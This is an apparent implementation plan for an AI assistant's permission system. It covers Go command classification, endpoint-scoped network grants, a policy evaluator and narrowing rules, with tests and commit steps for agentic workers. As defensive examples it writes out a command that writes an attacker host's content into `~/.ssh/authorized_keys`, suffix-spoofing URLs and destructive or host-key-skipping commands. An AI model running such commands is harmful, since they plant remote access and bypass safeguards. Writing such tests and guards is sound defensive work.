# Assistant permissions — implementation plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use beads-superpowers:subagent-driven-development (recommended) or beads-superpowers:executing-plans to implement this plan task-by-task. Each Task becomes a bead (`bd create -t task --parent <epic-id>`). Steps within tasks use checkbox (`- [ ]`) syntax for human readability.

**Goal:** A person can answer "what should happen the next time this comes up" for the situations they actually meet, see every answer they have given, find out why any call was allowed or refused, and take any answer back.

**Architecture:** The stored shape does not change — ADR-0020 §7's matrix stays, and invocation rules stay its exceptions. What changes is the vocabulary above it: the unit of configuration becomes a sentence about a future question. Three model gaps are closed first (a classifier blind spot that is a shipped P1, a split containment evaluator, and a rule language with only "exactly this" and "everything"), then the wire carries rules and a decision trace to the renderer, then the page is rebuilt on that trace.

**Tech Stack:** Go (`internal/content`, `internal/assistant`, `internal/agenttools`, `internal/transport`), SolidJS + TypeScript (`frontend/src`), JSON Schema contracts (`contracts/`), Playwright (`e2e/`).

**Spec:** `.internal/specs/2026-09-03-assistant-permissions-design.md`

## Global Constraints

- **No configuration path may name a tool** (ADR-0028 decision 4). Selectors name a command word in a parsed invocation; scopes name effects and resources. A tool-kind scope is already refused by `EffectRow.UnmarshalJSON` and stays refused.
- **The matrix shape is settled** (ADR-0020 §7 as amended, accepted 2026-08-16): one row per effect class, one decision, resource scopes. No task changes it.
- **Fail toward asking.** An absent rule, an absent row, an unparseable document and a stale evaluator version all ask. No task may introduce a zero value that permits.
- **Precedence is unchanged:** most restrictive among matching rules; a rule stricter than its row beats the row; a `refuse` row short-circuits before rules are read (`internal/content/effectpolicy.go:223, 229-245`).
- **No Save button, no unsaved state.** Every gesture writes and the surface adopts what the store returns.
- **Greenfield:** no migrations, no back-compat shims. A stored policy that no longer parses degrades to the zero matrix, which asks.
- **Contracts:** a method whose result shape changes gets its schema and its `_OverTheWireConformsToContract` test in the same commit (`contracts/README.md`).
- **Every commit names its bead** in the subject, per `AGENTS.md`.
- **A worker runs the unit tests for the files it changed and stops there.** `make ci-full`, the containerized jobs and the e2e suite belong to whoever integrates.

---

### Task 1: A path a command writes through an option is a written resource (`nocx-3j47q`, P1)

**Files:**

- Modify: `internal/assistant/cmdeffect.go` — `resourceOperands` (:485-505), `optionTakesNextValue` (:528-559), the `curl` branch (:299-307)
- Modify: `internal/content/resources.go` — `ResourceReport` gains `Features`
- Test: `internal/assistant/cmdeffect_test.go`

**Why first:** this is a defect in shipped code, not a consequence of the design. `optionTakesNextValue("curl","-o")` is true, so `resourceOperands` consumes `-o` together with its value and never records the target; the curl branch records only the URL under `ResourceNetwork`, which maps to `EffectCrossBoundary`. A person who sets "Reach another host" to Allowed has thereby allowed `curl -o /home/dev/.ssh/authorized_keys https://attacker`. It also blocks Task 5: a refusal must match a semantic feature the classifier records, not the spelling of a token.

**Interfaces:**

- Consumes: nothing.
- Produces:
  - `content.ResourceReport.Features []string` — semantic facts the parser established about the invocation. The one value this task introduces is `"writes-option-named-path"`.
  - `func optionWritesNextValue(program, option string) bool` in `cmdeffect.go` — a strict subset of `optionTakesNextValue`. Task 5 matches on `Features`, never on this.

**Acceptance Criteria:**

- `curl -o /tmp/proof https://example.com` records `/tmp/proof` as a resource with verb `ResourceWrite`, and the invocation carries the feature `writes-option-named-path`.
- Because the report then mixes `ResourceNetwork` and `ResourceWrite`, `ResourceReport.Effect` returns `WorstEffect(declared)` — for `session.run` that is `mutate-destructive`, not `cross-boundary`.
- `curl -o "$OUT" https://example.com` — a dynamic target — is unresolved, so the invocation is disqualified rather than classified as harmless.
- `curl https://example.com` is unchanged: one network resource, `cross-boundary`.
- Every entry of `optionTakesNextValue` whose value is a written path is covered by a test naming that program and option. Options whose value is **not** a path are covered by a test that they are still not resources: `ssh -o` (a config keyword), `bash -o` (a shell option name), `install -o` (an owner), `grep -f` (a pattern file, read not written).
- The attached and long forms are covered: `-ofile`, `--output file`, `--output=file`.

- [ ] **Step 1: Write the failing test**

```go
func TestCurlOutputOptionIsAWrittenResource(t *testing.T) {
	inv := parseInvocation("curl -o /tmp/proof https://example.com")

	if !inv.Parsed || inv.Disqualified {
		t.Fatalf("expected a parsed, qualified invocation, got parsed=%v disqualified=%v",
			inv.Parsed, inv.Disqualified)
	}
	if !hasResource(inv.Resources, "/tmp/proof", content.ResourceWrite) {
		t.Errorf("the file curl writes is not in the report: %+v", inv.Resources)
	}
	if !hasFeature(inv.Resources, "writes-option-named-path") {
		t.Errorf("the feature a refusal has to match is absent: %+v", inv.Resources.Features)
	}

	declared := []content.Effect{
		content.EffectObserve, content.EffectMutateReversible,
		content.EffectMutateDestructive, content.EffectDelegate,
		content.EffectCrossBoundary,
	}
	if got := inv.Resources.Effect(declared); got != content.EffectMutateDestructive {
		t.Errorf("a curl that writes a file classified as %q; a mixed report takes the worst declared effect", got)
	}
}
```

Add the two helpers beside it if the file does not already have them:

```go
func hasResource(r content.ResourceReport, path string, verb content.ResourceVerb) bool {
	for _, res := range r.Resources {
		if res.Path == path && res.Verb == verb {
			return true
		}
	}
	return false
}

func hasFeature(r content.ResourceReport, feature string) bool {
	for _, f := range r.Features {
		if f == feature {
			return true
		}
	}
	return false
}
```

Use whatever the file already calls the parse entry point; `parseInvocation` above stands for it.

- [ ] **Step 2: Run it and watch it fail**

Run: `go test ./internal/assistant/ -run TestCurlOutputOptionIsAWrittenResource -v`
Expected: FAIL — `ResourceReport` has no field `Features`, and once that compiles, the write is absent and the effect is `cross-boundary`.

- [ ] **Step 3: Add the feature field**

In `internal/content/resources.go`, on `ResourceReport`:

```go
// Features are semantic facts the parser established about the invocation,
// as opposed to the resources it named. A narrowing rule matches a feature
// rather than the spelling of a token, because -o, --output, --output=file
// and an attached short option are the same fact written four ways
// (ADR-0028 decision 4 is untouched: a feature names a command's behaviour,
// never a tool).
Features []string `json:"features,omitempty"`
```

- [ ] **Step 4: Record the written path**

In `internal/assistant/cmdeffect.go`, add the subset table:

```go
// optionWritesNextValue reports whether this option's VALUE is a path the
// command writes. Strictly a subset of optionTakesNextValue: an entry here
// that is missing there is dead, because the value would be read as an
// operand before this is consulted.
//
// The distinction is per program and cannot be guessed from the letter.
// curl -o and sort -o name output files; ssh -o is a config keyword,
// bash -o is a shell option name, install -o is an owner, and grep -f is a
// pattern file the command READS.
func optionWritesNextValue(program, option string) bool {
	name := option
	if i := strings.IndexByte(option, '='); i >= 0 {
		name = option[:i]
	}
	switch program {
	case "curl":
		return name == "-o" || name == "--output"
	case "sort":
		return name == "-o" || name == "--output"
	default:
		return false
	}
}
```

Then change `resourceOperands` so a written option value is not silently skipped. It returns the operands as before and appends to the report through a pointer, so the caller keeps its shape:

```go
func resourceOperands(program string, args []commandWordFact, report *content.ResourceReport) []commandWordFact {
	operands := make([]commandWordFact, 0, len(args))
	optionsEnded := false
	for i := 0; i < len(args); i++ {
		arg := args[i]
		if !optionsEnded && arg.value == "--" {
			optionsEnded = true
			continue
		}
		if !optionsEnded && strings.HasPrefix(arg.value, "-") {
			if written, target, consumed := optionWrittenTarget(program, args, i); written {
				*report = addResource(*report, target, content.ResourceWrite)
				*report = addFeature(*report, featureWritesOptionNamedPath)
				i += consumed
				continue
			}
			if optionTakesNextValue(program, arg.value) && i+1 < len(args) {
				i++
			}
			continue
		}
		operands = append(operands, arg)
	}
	return operands
}
```

`optionWrittenTarget` resolves the three spellings and reports how many extra words it consumed:

```go
const featureWritesOptionNamedPath = "writes-option-named-path"

// optionWrittenTarget resolves the target of a write-bearing option in the
// three forms it can take: "-o file" and "--output file" (the value is the
// next word), "--output=file" (attached after =), and "-ofile" (attached to
// a short option). It returns the number of ADDITIONAL words consumed.
func optionWrittenTarget(program string, args []commandWordFact, i int) (bool, commandWordFact, int) {
	arg := args[i]
	if eq := strings.IndexByte(arg.value, '='); eq >= 0 {
		if !optionWritesNextValue(program, arg.value) {
			return false, commandWordFact{}, 0
		}
		return true, commandWordFact{value: arg.value[eq+1:], dynamic: arg.dynamic}, 0
	}
	if optionWritesNextValue(program, arg.value) {
		if i+1 >= len(args) {
			// The option is last and names nothing. It cannot be resolved,
			// and the caller's unresolved path is the honest answer.
			return true, commandWordFact{value: arg.value, dynamic: true}, 0
		}
		return true, args[i+1], 1
	}
	// "-ofile": a short write option with its value attached.
	if !strings.HasPrefix(arg.value, "--") && len(arg.value) > 2 &&
		optionWritesNextValue(program, arg.value[:2]) {
		return true, commandWordFact{value: arg.value[2:], dynamic: arg.dynamic}, 0
	}
	return false, commandWordFact{}, 0
}

func addFeature(report content.ResourceReport, feature string) content.ResourceReport {
	for _, existing := range report.Features {
		if existing == feature {
			return report
		}
	}
	report.Features = append(report.Features, feature)
	return report
}
```

A dynamic target reaches `addResource`, which already routes it to `Unresolved` — and `finalizeInvocation` already disqualifies an invocation with unresolved resources. That is the "cannot be resolved statically" half of the acceptance criteria, and it needs no new branch.

- [ ] **Step 5: Update every caller of `resourceOperands`**

`grep -n 'resourceOperands(' internal/assistant/cmdeffect.go` lists them. Each now threads `&report`. The curl branch becomes:

```go
case "curl":
	operands := resourceOperands("curl", args, &report)
	if len(operands) == 0 {
		return unresolvedCommand(report, program, "has no statically named URL")
	}
	for _, operand := range operands {
		report = addResource(report, operand, content.ResourceNetwork)
	}
	return report
```

- [ ] **Step 6: Run the test and the package**

Run: `go test ./internal/assistant/ ./internal/content/ -race`
Expected: PASS. A pre-existing test asserting `curl -o …` is `cross-boundary` is now WRONG and is updated, not deleted — the new expectation is `mutate-destructive`, and the update is part of this change.

- [ ] **Step 7: Add the negative and spelling tests**

```go
func TestOptionValuesThatAreNotWrittenPaths(t *testing.T) {
	for _, tc := range []struct{ name, command string }{
		{"ssh -o is a config keyword", "ssh -o StrictHostKeyChecking=no host"},
		{"bash -o is a shell option", "bash -o pipefail script.sh"},
		{"install -o is an owner", "install -o root /src /dst"},
		{"grep -f reads a pattern file", "grep -f patterns.txt file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			inv := parseInvocation(tc.command)
			if hasFeature(inv.Resources, featureWritesOptionNamedPath) {
				t.Errorf("%q was read as writing a file through an option", tc.command)
			}
		})
	}
}

func TestWrittenOptionSpellings(t *testing.T) {
	for _, command := range []string{
		"curl -o /tmp/p https://example.com",
		"curl -o/tmp/p https://example.com",
		"curl --output /tmp/p https://example.com",
		"curl --output=/tmp/p https://example.com",
	} {
		inv := parseInvocation(command)
		if !hasResource(inv.Resources, "/tmp/p", content.ResourceWrite) {
			t.Errorf("%q did not record its output file: %+v", command, inv.Resources)
		}
	}
}
```

- [ ] **Step 8: Run, then commit**

Run: `go test ./internal/assistant/ ./internal/content/ -race`

```bash
git add internal/assistant/cmdeffect.go internal/assistant/cmdeffect_test.go internal/content/resources.go
git commit -m "fix(assistant): a path written through an option is a written resource (nocx-3j47q)"
```

---

### Task 2: An endpoint scope, and both places that enforce it (`nocx-67byy`)

**Files:**

- Modify: `internal/content/resource_scope.go` — `ValidateGrantScope` (:13-36), `Contains` (:38-86)
- Modify: `internal/agenttools/registry.go` — `URLScope.Allows` (:44-54), and the redirect path in `internal/assistant/classifier.go` / `connection.go`
- Test: `internal/content/resource_scope_test.go`, `internal/agenttools/registry_test.go`

**Why now:** independent of Task 1, so it runs beside it.

**Interfaces:**

- Consumes: nothing.
- Produces: a destination scope id in the endpoint form `scheme://host[:port]` with an `includeSubdomains` marker. The stored form is the scope's `ID` string plus `GrantScope.IncludeSubdomains bool`; `Contains` and `URLScope.Allows` both read it.

**Acceptance Criteria:**

- A destination scope `https://github.com` contains `https://github.com/owner/repo` and does not contain `https://api.github.com/x`.
- The same scope with `IncludeSubdomains` contains `https://api.github.com/x`, and still does not contain `https://notgithub.com` or `https://github.com.evil.example`.
- Scheme must match: `https://github.com` never contains `http://github.com/...`.
- An omitted port and the scheme's default port canonicalize together; a non-default port matches exactly.
- Host normalization covers case, IDNA/punycode, a trailing dot and IPv6 brackets. A URL carrying `userinfo` is refused by `ValidateGrantScope`.
- An IP literal with `IncludeSubdomains` is refused by `ValidateGrantScope` — subdomain semantics for an address is meaningless.
- `URLScope.Allows` honours the endpoint form. A test asserts the capability refuses a URL the page would show as covered by a DIFFERENT endpoint, so the two cannot drift.
- The scope is re-checked on every redirect hop, with a test that a redirect off the endpoint is refused.
- `*` keeps its meaning and remains distinguishable from an endpoint grant.

- [ ] **Step 1: Write the failing containment table**

```go
func TestDestinationEndpointContainment(t *testing.T) {
	for _, tc := range []struct {
		name   string
		scope  content.GrantScope
		url    string
		inside bool
	}{
		{"a path under the endpoint", endpoint("https://github.com", false), "https://github.com/owner/repo", true},
		{"a subdomain without the marker", endpoint("https://github.com", false), "https://api.github.com/x", false},
		{"a subdomain with the marker", endpoint("https://github.com", true), "https://api.github.com/x", true},
		{"a name that merely shares a suffix", endpoint("https://github.com", true), "https://notgithub.com/x", false},
		{"a longer name ending elsewhere", endpoint("https://github.com", true), "https://github.com.evil.example/x", false},
		{"a scheme downgrade", endpoint("https://github.com", true), "http://github.com/x", false},
		{"the default port, spelled", endpoint("https://github.com", false), "https://github.com:443/x", true},
		{"a non-default port", endpoint("https://github.com:8443", false), "https://github.com/x", false},
		{"case and a trailing dot", endpoint("https://GitHub.com.", false), "https://github.com/x", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := tc.scope.Contains(content.GrantScope{Kind: content.ResourceDestination, ID: tc.url})
			if got != tc.inside {
				t.Errorf("Contains(%q) = %v, want %v", tc.url, got, tc.inside)
			}
		})
	}
}
```

- [ ] **Step 2: Run it and watch it fail**

Run: `go test ./internal/content/ -run TestDestinationEndpointContainment -v`
Expected: FAIL — today `Contains` compares destination ids for equality, so every row is `false` except none.

- [ ] **Step 3: Implement**

Add the marker to `GrantScope`, parse the endpoint once, and compare label-wise. Reject in `ValidateGrantScope` what must never be stored:

```go
case ResourceDestination:
	if scope.ID == "*" {
		if scope.IncludeSubdomains {
			return fmt.Errorf("resource scope: * already covers every address; it cannot also include subdomains")
		}
		return nil
	}
	ep, err := parseEndpoint(scope.ID)
	if err != nil {
		return fmt.Errorf("resource scope: destination %q: %w", scope.ID, err)
	}
	if scope.IncludeSubdomains && ep.isIP {
		return fmt.Errorf("resource scope: %q is an address, and an address has no subdomains", scope.ID)
	}
```

`parseEndpoint` lowercases the host, strips a trailing dot, converts to punycode, canonicalizes the default port for the scheme, keeps IPv6 brackets, and refuses `userinfo`, a path, a query or a fragment. Containment is then: scheme equal, port equal, and host equal — or, with the marker, `strings.HasSuffix(child.host, "."+parent.host)`, which is the label boundary and is what makes `notgithub.com` and `github.com.evil.example` outside.

- [ ] **Step 4: Run the table**

Run: `go test ./internal/content/ -run TestDestinationEndpointContainment -v`
Expected: PASS, all nine rows.

- [ ] **Step 5: Write the failing capability test**

```go
func TestURLScopeHonoursTheEndpointForm(t *testing.T) {
	scope := &agenttools.URLScope{URLs: []string{"https://github.com"}, IncludeSubdomains: true}
	if !scope.Allows("https://api.github.com/x") {
		t.Error("the capability refused a URL the policy covers; the page would show a grant the dialler ignores")
	}
	if scope.Allows("https://github.com.evil.example/x") {
		t.Error("the capability allowed a suffix-alike")
	}
}
```

- [ ] **Step 6: Implement, run, and cover the redirect hop**

`URLScope.Allows` delegates to the same containment predicate rather than re-implementing it — one owner for the behaviour, per `AGENTS.md`. Then find the redirect handling named in `internal/assistant/classifier.go:193-195` and assert a redirect off the endpoint is refused.

Run: `go test ./internal/agenttools/ ./internal/assistant/ ./internal/content/ -race`

- [ ] **Step 7: Commit**

```bash
git add internal/content/resource_scope.go internal/content/resource_scope_test.go \
        internal/agenttools/registry.go internal/agenttools/registry_test.go
git commit -m "feat(content,agenttools): a network grant can name an endpoint, and both enforcers read it (nocx-67byy)"
```

---

### Task 3: A command's resources produce scopes of every kind they can name (`nocx-yso3z`)

**Files:**

- Modify: `internal/content/effectpolicy.go` — `namedResourceScope` (:303-307), `namedResourcesWithinRow` (:270-)
- Test: `internal/content/effectpolicy_test.go`

**Depends on:** Task 2 (the endpoint form is what a command's URL becomes).

**Interfaces:**

- Consumes: `parseEndpoint` and the destination containment from Task 2.
- Produces: `namedResourceScope(r Resource) (GrantScope, bool)` returning a `ResourceDestination` scope for a resource whose verb is `ResourceNetwork`, and a `ResourcePath` scope for an absolute path, as today.

**Acceptance Criteria:**

- A row whose destination scope is `https://github.com` bounds `curl https://example.com` — the call is not permitted by that row.
- The same policy and the same address give the same outcome through `curl` and through `fetch.url`, asserted in one test that drives both.
- A resource kind a command can name and which has no scope form fails at startup rather than passing silently: a table of `ResourceVerb` → scope kind is exhaustive, and an unmapped verb is a `panic` at init or a test failure, not a `false` return.

- [ ] **Step 1: Write the failing test**

```go
func TestARowDestinationScopeBoundsACommandToo(t *testing.T) {
	policy := content.EffectPolicy{}
	policy = policy.WithRow(content.EffectCrossBoundary, content.EffectRow{
		Decision: content.DecisionPermit,
		Scopes: []content.GrantScope{
			{Kind: content.ResourceDestination, ID: "https://github.com"},
		},
	})

	inv := parseInvocation("curl https://example.com")
	if got := policy.DecisionForInvocation(content.EffectCrossBoundary, inv); got == content.DecisionPermit {
		t.Error("a command reached an address outside the row's only scope and was permitted")
	}
}
```

- [ ] **Step 2: Run it and watch it fail**

Run: `go test ./internal/content/ -run TestARowDestinationScopeBoundsACommandToo -v`
Expected: FAIL — `namedResourceScope` returns `false` for a network resource, so `namedResourcesWithinRow` finds nothing to bound and the permit stands.

- [ ] **Step 3: Implement**

```go
// namedResourceScope maps one resource a command named to the scope kind a
// row states it in. The mapping is exhaustive over ResourceVerb by
// construction: a verb with no scope kind is a resource a row can never
// bound, which is how a destination scope came to govern fetch.url and not
// curl (nocx-yso3z).
func namedResourceScope(r Resource) (GrantScope, bool) {
	switch r.Verb {
	case ResourceNetwork:
		return GrantScope{Kind: ResourceDestination, ID: r.Path}, true
	case ResourceRead, ResourceWrite, ResourceDelete, ResourceExecute, ResourceSource:
		if !isAbsolutePath(r.Path) {
			return GrantScope{}, false
		}
		return GrantScope{Kind: ResourcePath, ID: r.Path}, true
	default:
		return GrantScope{}, false
	}
}
```

Add the exhaustiveness test:

```go
func TestEveryResourceVerbHasAScopeKind(t *testing.T) {
	for _, verb := range content.AllResourceVerbs() {
		if _, ok := content.NamedResourceScopeForTest(content.Resource{Path: "/x", Verb: verb}); !ok && verb != content.ResourceUnknown {
			t.Errorf("verb %q maps to no scope kind: a row can never bound it", verb)
		}
	}
}
```

- [ ] **Step 4: Run, then write the cross-path test**

```go
func TestTheSameAddressIsBoundedTheSameWayThroughACommandAndATool(t *testing.T) {
	// One policy, one out-of-scope address, two paths to it.
	// The declared path goes through the kernel scope check; the command
	// path through DecisionForInvocation. They must agree.
}
```

Fill it in against the kernel entry point Task 4 unifies; if Task 4 has not landed, assert only that neither answers `permit`, and tighten it in Task 4.

- [ ] **Step 5: Commit**

```bash
git add internal/content/effectpolicy.go internal/content/effectpolicy_test.go
git commit -m "fix(content): a command's network resource is a destination scope, so a row can bound curl (nocx-yso3z)"
```

---

### Task 4: One evaluator, one typed cause, and an out-of-scope resource that can be answered (`nocx-okdsm`, supersedes `nocx-j5fdf`)

**Files:**

- Modify: `internal/content/effectpolicy.go` — `DecisionForInvocation` (:218-250), the doc on `EffectRow` (:57-63)
- Modify: `internal/assistant/kernel.go` — `RefusedOutOfScope` (:79), the scope check at :599
- Test: `internal/content/effectpolicy_test.go`, `internal/assistant/kernel_test.go`

**Depends on:** Task 3.

**Interfaces:**

- Produces:

```go
// OutOfScopeCause says WHY a resource fell outside, because the two answers
// are different products: a row scope a person can widen is a question, and
// a fence they cannot is a refusal.
type OutOfScopeCause string

const (
	OutOfScopeRowScope OutOfScopeCause = "row-scope" // editable: ask, and offer to widen
	OutOfScopeFence    OutOfScopeCause = "fence"     // immutable: refuse; approval cannot help
)

// Verdict is what one evaluation answers. Decision is what happens; Cause
// and Resource are what the surface needs to say why.
type Verdict struct {
	Decision Decision
	Cause    OutOfScopeCause
	Resource GrantScope
}

func (p EffectPolicy) EvaluateInvocation(e Effect, inv Invocation, fence []GrantScope) Verdict
```

`DecisionForInvocation` stays as a thin wrapper returning `EvaluateInvocation(...).Decision`, so no caller is forced to change in this task.

**Acceptance Criteria:**

- A permitted invocation naming a resource outside an editable row scope returns `Decision: ask`, `Cause: row-scope`, and the resource that fell outside.
- The same resource outside the run fence or a capability returns `Decision: refuse`, `Cause: fence`. Approval is not offered, because approval cannot make it executable.
- The declared path returns the same `Verdict` for the same policy and resource — one test drives both and compares whole verdicts, not decisions.
- `EffectRow`'s doc comment matches the code beneath it. The claim "refused, never silently re-scoped" is replaced by the two-cause rule.
- The filesystem capability (`internal/filesystem/scoped.go`) still refuses, symlink escapes included — asserted by a test that a policy `ask` does not become a filesystem read.

- [ ] **Step 1: Write the failing verdict test**

```go
func TestOutOfScopeCauseSeparatesAQuestionFromARefusal(t *testing.T) {
	policy := permitReadsWithin(t, "/workspace")

	editable := policy.EvaluateInvocation(content.EffectObserve,
		parseInvocation("cat /etc/hosts"), nil)
	if editable.Decision != content.DecisionAsk || editable.Cause != content.OutOfScopeRowScope {
		t.Errorf("a path outside an editable row scope gave %+v; it must be a question", editable)
	}
	if editable.Resource.ID != "/etc/hosts" {
		t.Errorf("the verdict does not name what fell outside: %+v", editable.Resource)
	}

	fenced := policy.EvaluateInvocation(content.EffectObserve,
		parseInvocation("cat /etc/hosts"),
		[]content.GrantScope{{Kind: content.ResourcePath, ID: "/workspace"}})
	if fenced.Decision != content.DecisionRefuse || fenced.Cause != content.OutOfScopeFence {
		t.Errorf("a path outside the fence gave %+v; approval cannot make it executable", fenced)
	}
}
```

- [ ] **Step 2: Run and watch it fail** — `EvaluateInvocation` does not exist.

Run: `go test ./internal/content/ -run TestOutOfScopeCause -v`

- [ ] **Step 3: Implement `EvaluateInvocation`**

Lift the body of `DecisionForInvocation` into it, then replace the closing scope check:

```go
	if decision == DecisionPermit {
		if outside, ok := p.firstOutsideFence(inv.Resources, fence); ok {
			return Verdict{Decision: DecisionRefuse, Cause: OutOfScopeFence, Resource: outside}
		}
		if outside, ok := p.firstOutsideRow(e, inv.Resources); ok {
			return Verdict{Decision: DecisionAsk, Cause: OutOfScopeRowScope, Resource: outside}
		}
	}
	return Verdict{Decision: decision}
```

The fence is checked first: an immutable bound cannot be widened by an answer, so offering the question would be the lie the spec names.

- [ ] **Step 4: Point the kernel at it**

`internal/assistant/kernel.go` stops computing its own answer and returns the same `Verdict`. `RefusedOutOfScope` remains the refusal reason for `Cause: fence` and is no longer produced for a row scope.

- [ ] **Step 5: Rewrite the `EffectRow` doc comment**

Replace lines 57-63's "a call naming a resource outside the row's scopes is refused, never silently re-scoped" with the two causes and which layer owns each — the fence refuses, the policy asks, and `Contains` remains a policy-time predicate and never a filesystem authorization (`resource_scope.go:43-47`).

- [ ] **Step 6: Run both packages, then commit**

Run: `go test ./internal/content/ ./internal/assistant/ ./internal/filesystem/ -race`

```bash
git add internal/content/effectpolicy.go internal/content/effectpolicy_test.go \
        internal/assistant/kernel.go internal/assistant/kernel_test.go
git commit -m "fix(content,assistant): an out-of-scope resource asks or refuses by cause, and one evaluator says which (nocx-okdsm)"
```

Then: `bd close nocx-j5fdf --reason "Superseded by nocx-okdsm and .internal/specs/2026-09-03-assistant-permissions-design.md §5.3. That bead asked for a row to escalate instead of refusing while keeping an out-of-fence read refusing; the accepted design splits on the CAUSE instead — an editable row scope asks and offers to widen, an immutable fence refuses. Implemented as content.Verdict.Cause."`

---

### Task 5: The rule language grows one axis, asymmetrically (`nocx-6to7g`, `nocx-pvr2h`)

**Files:**

- Modify: `internal/content/rules.go` — `InvocationRule` (:20-30), `Matches` (:131-148), `validateInvocationRules`
- Modify: `internal/content/effectpolicy.go` — the rule loop in `EvaluateInvocation`
- Test: `internal/content/rules_test.go`

**Depends on:** Task 1 (the feature it matches), Task 4 (the loop it edits).

**Interfaces:**

- Produces:

```go
// InvocationSelector is a closed sum: exactly one field is set.
type InvocationSelector struct {
	Exact      [][]string  `json:"exact,omitempty"`
	Program    string      `json:"program,omitempty"`
	HasFeature *FeatureRef `json:"hasFeature,omitempty"`
}

type FeatureRef struct {
	Program string `json:"program"`
	Feature string `json:"feature"`
}

type InvocationRule struct {
	ID           string             `json:"id"`
	Selector     InvocationSelector `json:"selector"`
	Decision     Decision           `json:"decision"`
	GrantedUnder Effect             `json:"grantedUnder,omitempty"`
}
```

**Acceptance Criteria:**

- A `Program` rule with `permit` and no `GrantedUnder` is an unparseable policy — `validateInvocationRules` rejects it and `ParseEffectPolicy` fails.
- A `HasFeature` rule with `permit` is an unparseable policy, in any spelling.
- A `Program{df}` rule granted under `observe` permits `df --output=source`, and does NOT permit an invocation of the same program classifying under a stricter effect — asserted with `find`, granted under `observe`, against `find . -delete`.
- A `HasFeature{curl, writes-option-named-path}` refusal beats a `Program{curl}` permit for `curl -o /tmp/x https://y`, through `EvaluateInvocation` rather than through the store.
- A disqualified invocation still bypasses rules entirely and falls to the row, refusals included.
- `LiteralInvocationRule` still produces only `Exact`, still refuses a pattern character, and is still the only form the prompt can save.
- A tool-kind scope and a tool name as a row key are still refused.

- [ ] **Step 1: Write the failing asymmetry test**

```go
func TestALooseSelectorMayNarrowAndMayNotWiden(t *testing.T) {
	loosePermit := content.InvocationRule{
		Selector: content.InvocationSelector{
			HasFeature: &content.FeatureRef{Program: "curl", Feature: "writes-option-named-path"},
		},
		Decision: content.DecisionPermit,
	}
	if err := content.ValidateInvocationRulesForTest([]content.InvocationRule{loosePermit}); err == nil {
		t.Error("a feature selector was accepted with permit; a loose matcher may only narrow")
	}

	looseRefusal := loosePermit
	looseRefusal.Decision = content.DecisionRefuse
	if err := content.ValidateInvocationRulesForTest([]content.InvocationRule{looseRefusal}); err != nil {
		t.Errorf("a feature selector was rejected with refuse: %v", err)
	}

	unguarded := content.InvocationRule{
		Selector: content.InvocationSelector{Program: "df"},
		Decision: content.DecisionPermit,
	}
	if err := content.ValidateInvocationRulesForTest([]content.InvocationRule{unguarded}); err == nil {
		t.Error("a program-wide permit was accepted with no effect it was granted under")
	}
}
```

- [ ] **Step 2: Run and watch it fail** — the types do not exist.

Run: `go test ./internal/content/ -run TestALooseSelector -v`

- [ ] **Step 3: Implement the selector and its validation**

`Matches` dispatches on the set field. `Exact` keeps today's body verbatim. `Program` compares `inv.Commands[i][0]` and requires the rule's `GrantedUnder` to equal the effect the CALL classified as — which `Matches` cannot know, so the guard lives in the rule loop and `Matches` returns a candidate:

```go
for _, rule := range p.Rules {
	if !rule.Selector.Matches(inv) {
		continue
	}
	if rule.Decision == DecisionPermit && rule.GrantedUnder != "" && rule.GrantedUnder != e {
		// The permit was granted while this command did something milder.
		// It does not reach this call. This is the whole guard.
		continue
	}
	...
}
```

`validateInvocationRules` refuses: more than one selector field set; `HasFeature` with `permit`; `Program` with `permit` and empty `GrantedUnder`; an empty `Program`; an unknown feature name.

- [ ] **Step 4: Write the guard test and run**

```go
func TestAWidenedPermitDoesNotReachAStricterCall(t *testing.T) {
	policy := askEverything(t).WithRule(content.InvocationRule{
		Selector:     content.InvocationSelector{Program: "find"},
		Decision:     content.DecisionPermit,
		GrantedUnder: content.EffectObserve,
	})

	if got := policy.EvaluateInvocation(content.EffectMutateDestructive,
		parseInvocation("find . -delete"), nil).Decision; got == content.DecisionPermit {
		t.Error("a permit granted while find was reading permitted find . -delete")
	}
}
```

Run: `go test ./internal/content/ -race`

- [ ] **Step 5: Commit**

```bash
git add internal/content/rules.go internal/content/rules_test.go internal/content/effectpolicy.go
git commit -m "feat(content): a rule may narrow loosely and may widen only under the effect it was granted for (nocx-6to7g, nocx-pvr2h)"
```

---

### Task 6: Provenance, and the evaluator version that invalidates a widened rule

**Files:**

- Modify: `internal/content/rules.go` — `InvocationRule` gains provenance
- Modify: `internal/assistant/cmdeffect.go` — the evaluator version constant
- Test: `internal/content/rules_test.go`

**Depends on:** Task 5.

**Interfaces:**

- Produces: `InvocationRule.CreatedAt time.Time`, `.Source RuleSource` (`"answered"` | `"written"`), `.EvaluatorVersion int`; and `const EvaluatorVersion = 2` in `internal/assistant`, bumped by Task 1's change to how commands are read.

**Acceptance Criteria:**

- A `Program` rule whose `EvaluatorVersion` differs from the current one does not apply — `EvaluateInvocation` skips it — and is reported as needing confirmation.
- An `Exact` rule is unaffected by a version change: it names a literal command line the person was shown.
- Confirming a rule rewrites its version and nothing else.
- Every rule has a stable `ID` from creation, and two rules never share one.

- [ ] **Step 1: Write the failing test**

```go
func TestAWidenedRuleFromAnOlderEvaluatorDoesNotApply(t *testing.T) {
	stale := content.InvocationRule{
		ID: "r1", Selector: content.InvocationSelector{Program: "df"},
		Decision: content.DecisionPermit, GrantedUnder: content.EffectObserve,
		EvaluatorVersion: assistant.EvaluatorVersion - 1,
	}
	policy := askEverything(t).WithRule(stale)
	if got := policy.EvaluateInvocation(content.EffectObserve, parseInvocation("df -h"), nil).Decision; got == content.DecisionPermit {
		t.Error("a widened rule saved under an older reading of commands still applied")
	}
	if !policy.RuleNeedsConfirming("r1") {
		t.Error("the rule is inert and nothing says so")
	}
}
```

- [ ] **Steps 2-4:** run it red, implement, run it green, and add the `Exact`-is-unaffected case.

- [ ] **Step 5: Commit**

```bash
git commit -am "feat(content): a widened rule carries where it came from and the reading it was saved under (nocx-0ykkk)"
```

---

### Task 7: The scope-expansion answer, and the bound on asking

**Files:**

- Modify: `internal/transport/ws_agent.go` — the approval path, `applyStandingAnswer` (:1887, :1917)
- Modify: `contracts/agent.approvalRequested.schema.json`, `contracts/agent.approve.schema.json`
- Test: `internal/transport/ws_agent_approval_contract_test.go`, `internal/transport/ws_policy_test.go`

**Depends on:** Task 4.

**Interfaces:**

- Consumes: `content.Verdict`.
